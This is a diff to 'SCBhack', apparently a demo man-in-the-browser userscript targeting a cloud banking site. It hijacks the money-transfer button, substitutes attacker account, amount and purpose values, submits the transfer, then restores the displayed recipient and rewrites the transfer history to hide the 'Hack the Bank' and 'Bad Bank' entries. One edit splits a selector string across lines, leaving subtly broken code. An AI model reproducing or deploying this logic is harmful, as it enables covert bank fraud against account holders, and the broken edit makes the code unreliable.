@@ -2,7 +2,7 @@
 // @name           SCBhack
 // @namespace      de.mrx.client
 // @description    Greasemonkey version of the hack.
-// @include        http://127.0.0.1*
+// @include        http://127.0.0.1*SCB*
 // @include        http*securecloudbanking.appspot.com*
 // @require		   http://code.jquery.com/jquery-1.3.2.js
 // ==/UserScript==
@@ -25,7 +25,9 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 	 function timedMsg()
 		 {
 		 
-		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){		 			
+		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){		 	
+
+		
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -48,13 +50,15 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 				$("input:eq(5)").val(HACK_AMOUNT);
 		 				$("input:eq(6)").val(HACK_USAGE);
 		 				sendMoneyBtnClone.attr("activateReset","true");
-		 				$("button[hackMarkerBtnOrig='true']").click();
+		 				$("button[hackMarkerBtnOrig='true']")[0].click();
 		 				$(this).hide();
 		 				});			
 		 			
 		 	});
 		 	
-		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){		 		
+		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)
+
+[activateReset='true']").each(function(){		 		
 		 		$("input:eq(1)").val(globalRC_Acc_Nr);
 				$("input:eq(2)").val(globalRC_Acc_Name);
 				$("input:eq(3)").val(globalRC_Bank_BLZ);
@@ -78,7 +82,7 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 	 				$("input:eq(4)").val(HACK_BANK_NAME);
 	 				$("input:eq(5)").val(HACK_AMOUNT);
 	 				$("input:eq(6)").val(HACK_USAGE);
-	 				$("button[hackMarkerConfirmBtnOrig='true']").click();
+	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
 	 				$("input:eq(1)").val(globalRC_Acc_Nr);
 					$("input:eq(2)").val(globalRC_Acc_Name);
 					$("input:eq(3)").val(globalRC_Bank_BLZ);
@@ -90,7 +94,9 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 	 			
 		 	});
 		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		 	
+		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		
+
+ 	
 		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
 		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Bad Bank)').text(bankText);
 		 	$(".TransfersOdd,.TransfersEven").filter(':contains(12060000)').text(globalRC_Bank_BLZ);
